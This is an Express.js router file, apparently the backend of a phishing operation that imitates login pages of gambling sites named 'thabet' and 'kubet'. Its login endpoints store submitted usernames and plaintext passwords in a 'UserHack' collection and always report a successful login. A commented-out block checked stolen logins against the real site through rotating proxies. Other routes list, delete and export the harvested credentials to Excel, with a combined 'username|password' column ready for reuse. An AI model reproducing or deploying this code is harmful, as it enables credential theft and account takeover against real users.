const express = require('express');
const router = express.Router()
const axios = require('axios')
const UserHack = require('../models/UserHack')
const UserRegister = require('../models/UserRegister')
const Setting = require('../models/Setting')
const { auto } = require('../util/auto');
const { auto2 } = require('../util/auto2');
const ExcelJS = require('exceljs');

const handleGetProxy = async () => {
    try {
        const setting = await Setting.findOne()
        console.log('setting', setting)

        const res = await axios.get(`http://proxy.tinsoftsv.com/api/getProxy.php?key=${setting.keyProxy}`)

        if (res && res.data.success) {
            return res.data.proxy
        }
    } catch (error) {
        return null
    }
}

const handleChangeProxy = async () => {
    try {
        const setting = await Setting.findOne()

        const res = await axios.get(`http://proxy.tinsoftsv.com/api/changeProxy.php?key=${setting.keyProxy}`)

        if (res && res.data.success) {
            return res.data.proxy
        } else {
            return null
        }
    } catch (error) {
        return null
    }
}

router.post('/api/thabet/login', async (req, res) => {
    const { username, password } = req.body
    var proxy;

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập đủ thông tin!'
        })
    }

    try {
        // const proxyNew = await handleChangeProxy()
        // console.log('proxyNew', proxyNew)

        // if (proxyNew) {
        //     proxy = proxyNew
        // } else {
        //     const proxyGet = await handleGetProxy()
        //     console.log('proxyGet', proxyGet)
        //     proxy = proxyGet
        // }


        // await auto(username, password, proxy, async (status, userpassword) => {
        //     if (status) {
        //         const newUser = new UserHack({
        //             username,
        //             password,
        //             casio: 'thabet'
        //         })
        //         await newUser.save()

        //         return res.status(200).json({
        //             success: true,
        //             message: 'Đăng nhập thành công',
        //         })
        //     } else {
        //         return res.status(400).json({
        //             success: false,
        //             message: 'Đăng nhập thất bại'
        //         })
        //     }
        // })

        const newUser = new UserHack({
            username,
            password,
            casio: 'thabet'
        })
        await newUser.save()

        return res.status(200).json({
            success: true,
            message: 'Đăng nhập thành công',
        })
    } catch (error) {
        console.log('error', error)
        return res.status(400).json({
            success: false,
            message: 'Your input is invalid'
        })
    }
})

router.post('/api/kubet/login', async (req, res) => {
    const { AccountID, AccountPWD } = req.body

    if (!AccountID || !AccountPWD) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập đủ thông tin!'
        })
    }

    try {
        const newUser = new UserHack({
            username: AccountID,
            password: AccountPWD,
            casio: 'kubet'
        })

        await newUser.save()

        return res.status(200).json({
            success: true,
            message: 'Đăng nhập thành công',
        })
    } catch (error) {
        console.log('error', error)
        return res.status(400).json({
            success: false,
            message: 'Your input is invalid'
        })
    }
})

router.post('/api/register', async (req, res) => {
    const { username, name, password, phone, casio } = req.body

    if (!username || !name || !password || !phone || !casio) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập đủ thông tin!'
        })
    }

    const newUser = new UserRegister({
        username,
        name,
        password,
        phone,
        casio
    })
    newUser.save()

    return res.status(200).json({
        success: true,
        message: 'Đăng ký thành công'
    })
})

router.get('/api/get-list-register', async (req, res) => {
    const { casio } = req.query

    if (!casio) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập đủ thông tin!'
        })
    }

    const listRegister = await UserRegister.find({ casio }).sort({ createdAt: -1 })
    return res.status(200).json({
        success: true,
        data: listRegister
    })
})

router.post('/api/delete-register', async (req, res) => {
    const { id } = req.body
    const userDelete = await UserRegister.findByIdAndDelete(id)
    if (userDelete) {
        return res.status(200).json({
            success: true,
            message: 'Xóa thành công'
        })
    } else {
        return res.status(400).json({
            success: false,
            message: 'Xóa thất bại'
        })
    }
})

router.get('/api/export-to-excel-register', async (req, res) => {
    const { casio } = req.query

    if (!casio) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập đủ thông tin!'
        })
    }

    try {
        const listRegister = await UserRegister.find({ casio })

        const workbook = new ExcelJS.Workbook();
        const worksheet = workbook.addWorksheet('User');

        worksheet.columns = [
            { header: 'Username', key: 'username', width: 40 },
            { header: 'Password', key: 'password', width: 40 },
            { header: 'Name', key: 'name', width: 40 },
            { header: 'Phone', key: 'phone', width: 40 },
            { header: 'Casio', key: 'casio', width: 40 },
        ];

        listRegister.forEach(user => {
            worksheet.addRow({
                username: user.username,
                name: user.name,
                password: user.password,
                phone: user.phone,
                casio: user.casio,
            })
        })

        // Tạo stream từ workbook và định dạng là Excel
        const stream = await workbook.xlsx.writeBuffer();

        // Thiết lập header cho response
        res.setHeader('Content-Disposition', `attachment; filename="export-list-register-${casio}.xlsx"`);
        res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

        // Gửi dữ liệu Excel đến client
        res.send(stream);

    } catch (error) {
        console.log('error', error)
        return res.status(400).json({
            success: false,
            message: 'Xuất file thất bại'
        })
    }
})

router.get('/api/get-list-user', async (req, res) => {
    const { casio } = req.query

    if (!casio) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập đủ thông tin!'
        })
    }

    const listUser = await UserHack.find({ casio }).sort({ createdAt: -1 })
    return res.status(200).json({
        success: true,
        data: listUser
    })
})

router.post('/api/delete-user', async (req, res) => {
    const { id } = req.body
    const userDelete = await UserHack.findByIdAndDelete(id)
    if (userDelete) {
        return res.status(200).json({
            success: true,
            message: 'Xóa thành công'
        })
    } else {
        return res.status(400).json({
            success: false,
            message: 'Xóa thất bại'
        })
    }
})

router.get('/api/export-to-excel', async (req, res) => {
    const { casio } = req.query

    if (!casio) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập đủ thông tin!'
        })
    }

    try {
        const listUser = await UserHack.find({ casio })

        const workbook = new ExcelJS.Workbook();
        const worksheet = workbook.addWorksheet('User');

        worksheet.columns = [
            { header: 'Username', key: 'username', width: 40 },
            { header: 'Password', key: 'password', width: 40 },
            { header: 'Casio', key: 'casio', width: 40 },
            { header: 'Create At', key: 'createdAt', width: 40 },
            { header: 'Username|Password', key: 'usernamepassword', width: 40 },
        ];

        listUser.forEach(user => {
            worksheet.addRow({
                username: user.username,
                password: user.password,
                casio: user.casio,
                createdAt: user.createdAt,
                usernamepassword: `${user.username}|${user.password}`
            })
        })

        // Tạo stream từ workbook và định dạng là Excel
        const stream = await workbook.xlsx.writeBuffer();

        // Thiết lập header cho response
        res.setHeader('Content-Disposition', `attachment; filename="export-list-user-${casio}.xlsx"`);
        res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

        // Gửi dữ liệu Excel đến client
        res.send(stream);

    } catch (error) {
        console.log('error', error)
        return res.status(400).json({
            success: false,
            message: 'Xuất file thất bại'
        })
    }
})

router.post('/api/delete-all-user', async (req, res) => {
    const { casio } = req.body
    const userDelete = await UserHack.deleteMany({ casio })
    if (userDelete) {
        return res.status(200).json({
            success: true,
            message: 'Xóa thành công'
        })
    } else {
        return res.status(400).json({
            success: false,
            message: 'Xóa thất bại'
        })
    }
})

router.post('/api/delete-all-register', async (req, res) => {
    const { casio } = req.body
    const userDelete = await UserRegister.deleteMany({ casio })
    if (userDelete) {
        return res.status(200).json({
            success: true,
            message: 'Xóa thành công'
        })
    } else {
        return res.status(400).json({
            success: false,
            message: 'Xóa thất bại'
        })
    }
})

router.get('/api/get-settings', async (req, res) => {
    try {
        const setting = await Setting.findOne()

        return res.status(200).json({
            success: true,
            data: setting
        })
    } catch (error) {
        return res.status(400).json({
            success: false,
            message: 'Lỗi hệ thống'
        })
    }
})

router.post('/api/update-settings', async (req, res) => {
    try {
        const { keyProxy, id } = req.body

        if (!keyProxy || !id) {
            return res.status(400).json({
                success: false,
                message: 'Vui lòng nhập đủ thông tin!'
            })
        }

        const setting = await Setting.findById(id)

        if (!setting) {
            return res.status(400).json({
                success: false,
                message: 'Không tìm thấy setting'
            })
        }

        setting.keyProxy = keyProxy

        await setting.save()

        return res.status(200).json({
            success: true,
            message: 'Cập nhật thành công'
        })
    } catch (error) {
        return res.status(400).json({
            success: false,
            message: 'Lỗi hệ thống'
        })
    }
})

router.get('*', function (req, res) {
    res.render('404');
});



// router.post('/cookie', homeController.cookie);
// router.get('/webhook', homeController.webhook);



module.exports = router